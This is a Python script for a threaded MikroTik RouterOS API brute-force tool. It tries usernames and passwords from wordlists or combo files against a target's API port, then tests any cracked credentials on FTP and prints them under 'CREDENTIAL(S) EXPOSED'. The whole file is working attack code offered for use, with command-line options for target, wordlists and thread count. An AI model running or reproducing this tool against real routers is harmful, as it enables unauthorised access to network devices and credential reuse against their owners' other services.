#!/usr/bin/env python
# -*- coding: utf-8 -*-
_version = "1.10"

import time, argparse, threading, concurrent.futures
from datetime import datetime
from pathlib import Path

try:
    from _api import Api
except ModuleNotFoundError:
    raise ImportError(f"[{datetime.now().strftime('%H:%M:%S')}] Module '_api' not found. Make sure the _api.py file is present in the same directory as this tool.")

try:
    from _log import Log
except ModuleNotFoundError:
    raise ImportError(f"[{datetime.now().strftime('%H:%M:%S')}] Module '_log' not found. Make sure the _log.py file is present in the same directory as this tool.")

def current_time():
    return datetime.now().strftime("%H:%M:%S")

class Bruteforce:
    def __init__(self, target, port, usernames, passwords, combo_dict, delay, use_ssl=False, max_workers=2, verbose=False, verbose_all=False, validate_services=None):
        self.target = target
        self.port = port
        self.usernames = usernames
        self.passwords = passwords
        self.combo_dict = combo_dict
        self.delay = delay
        self.use_ssl = use_ssl
        self.max_workers = min(max_workers, 15)
        self.verbose = verbose
        self.verbose_all = verbose_all
        self.validate_services = validate_services or {}
        self.log = Log(verbose=verbose, verbose_all=verbose_all)
        self.wordlist = []
        self.successes = []
        self.lock = threading.Lock()
        self.index_lock = threading.Lock()
        self.index = 0
        self.load_wordlist()

    def load_file(self, path):
        with open(path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]

    def load_wordlist(self):
        try:
            if self.combo_dict:
                self.wordlist = [tuple(line.strip().split(':')) for line in self.load_file(self.combo_dict) if ':' in line]
            elif self.usernames and self.passwords:
                is_userfile = Path(self.usernames).is_file()
                is_passfile = Path(self.passwords).is_file()

                if not is_userfile and not is_passfile:
                    self.wordlist = [(self.usernames, self.passwords)]
                elif is_userfile and not is_passfile:
                    users = self.load_file(self.usernames)
                    self.wordlist = [(u, self.passwords) for u in users]
                elif not is_userfile and is_passfile:
                    pwds = self.load_file(self.passwords)
                    self.wordlist = [(self.usernames, p) for p in pwds]
                else:
                    users = self.load_file(self.usernames)
                    pwds = self.load_file(self.passwords)
                    self.wordlist = [(u, p) for u in users for p in pwds]
            elif self.usernames:
                if Path(self.usernames).is_file():
                    self.wordlist = [(u, '') for u in self.load_file(self.usernames)]
                else:
                    self.wordlist = [(self.usernames, '')]
            elif self.passwords:
                if Path(self.passwords).is_file():
                    self.wordlist = [("admin", p) for p in self.load_file(self.passwords)]
                else:
                    self.wordlist = [("admin", self.passwords)]
            else:
                self.wordlist = [("admin", "")]
        except Exception as e:
            self.log.error(f"Error loading wordlist: {e}")
            exit(1)

        self.wordlist = list(dict.fromkeys(self.wordlist))

    def get_next_combo(self):
        with self.index_lock:
            if self.index >= len(self.wordlist):
                return None
            combo = self.wordlist[self.index]
            self.index += 1
            return combo

    def worker(self):
        while True:
            combo = self.get_next_combo()
            if combo is None:
                break
            user, password = combo
            if self.verbose_all:
                self.log.debug(f"Trying -> {user}:{password}")
            try:
                api = Api(self.target, self.port, use_ssl=self.use_ssl)
                result = api.login(user, password)
                if result:
                    with self.lock:
                        self.successes.append({"user": user, "pass": password, "services": ["api"]})
                    self.log.success(f"Current testing -> {user}:{password}")
                elif self.verbose:
                    self.log.fail(f"Current testing -> {user}:{password}")
            except Exception as e:
                if self.verbose_all:
                    self.log.warning(f"Error trying password '{password}': {e}")
            time.sleep(self.delay)

    def validate_extra_services(self):
        from ftplib import FTP

        for cred in self.successes:
            user = cred["user"]
            passwd = cred["pass"]
            validated = []

            if "ftp" in self.validate_services:
                port = self.validate_services.get("ftp") or 21
                try:
                    if self.verbose_all:
                        self.log.debug(f"Testing FTP for {user}:{passwd} on port {port}")
                    ftp = FTP()
                    ftp.connect(self.target, port, timeout=5)
                    ftp.login(user, passwd)
                    validated.append("ftp")
                    ftp.quit()
                except Exception as e:
                    if self.verbose_all:
                        self.log.debug(f"FTP validation failed for {user}:{passwd} on port {port} — {e}")


            if validated:
                cred["services"].extend(s for s in validated if s not in cred["services"])

    def run(self):
        self.log.info("[*] Starting brute force attack...")
        self.log.info(f"[*] Total Attempts {len(self.wordlist)}...")

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(self.worker) for _ in range(self.max_workers)]
            concurrent.futures.wait(futures)

        self.log.info("[*] Attack finished.\n")

        if self.validate_services and self.successes:
            for service in self.validate_services:
                self.log.info(f"[+] Testing service validation for: {service.upper()}...")
            self.validate_extra_services()

        if self.successes:
            print("\n## CREDENTIAL(S) EXPOSED ##")
            deduped = list({(d["user"], d["pass"]): d for d in self.successes}.values())
            max_user = max(len(d["user"]) for d in deduped)
            max_pass = max(len(d["pass"]) for d in deduped)
            print(f"{'-'*4}+{'-'*(max_user+2)}+{'-'*(max_pass+2)}+{'-'*10}")
            print(f"ORD | {'USERNAME':^{max_user}} | {'PASSWORD':^{max_pass}} | SERVICES")
            print(f"{'-'*4}+{'-'*(max_user+2)}+{'-'*(max_pass+2)}+{'-'*10}")
            for idx, d in enumerate(deduped, start=1):
                services = ', '.join(d["services"])
                print(f"{idx:03} | {d['user']:^{max_user}} | {d['pass']:^{max_pass}} | {services}")
            print("\nAttack completed successfully.\n")
        else:
            print("\nNo credentials were validated successfully with the given users and passwords.\n")

# === MAIN EXECUTION ===

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Mikrotik API Brute Force Tool")
    parser.add_argument("-t", "--target", required=True, help="Mikrotik IP address")
    parser.add_argument("-T", "--port", type=int, default=8728, help="API port (default: 8728)")
    parser.add_argument("-U", "--user", help="Single username")
    parser.add_argument("-P", "--passw", help="Single password")
    parser.add_argument("-u", "--userlist", help="Path to user wordlist")
    parser.add_argument("-p", "--passlist", help="Path to password wordlist")
    parser.add_argument("-d", "--dictionary", help="Path to combo dictionary (user:pass)")
    parser.add_argument("-s", "--seconds", type=int, default=1, help="Delay between attempts (default: 1s)")
    parser.add_argument("--ssl", action="store_true", help="Use SSL connection (port 8729)")
    parser.add_argument("--threads", type=int, default=2, help="Number of concurrent threads (default: 2, max: 15)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Show failed and warning attempts")
    parser.add_argument("-vv", "--verbose-all", action="store_true", help="Show debug and error messages")
    parser.add_argument("--validate", help="Comma-separated services or service=port (e.g., ftp,ssh=2222)")

    args = parser.parse_args()
    Log.banner()

    def parse_validate_services(raw_input):
        services = {}
        if not raw_input:
            return services
        for item in raw_input.split(','):
            item = item.strip()
            if '=' in item:
                name, port = item.split('=', 1)
                if port.isdigit():
                    services[name.lower()] = int(port)
            else:
                services[item.lower()] = None
        return services

    service_ports = parse_validate_services(args.validate)
    usernames = args.userlist if args.userlist else args.user
    passwords = args.passlist if args.passlist else args.passw

    bf = Bruteforce(
        target=args.target,
        port=args.port,
        usernames=usernames,
        passwords=passwords,
        combo_dict=args.dictionary,
        delay=args.seconds,
        use_ssl=args.ssl,
        max_workers=args.threads,
        verbose=args.verbose,
        verbose_all=args.verbose_all,
        validate_services=service_ports
    )

    try:
        bf.run()
    except KeyboardInterrupt:
        print(f"\n[{current_time()}] [!] Attack interrupted by user. Exiting cleanly.\n")
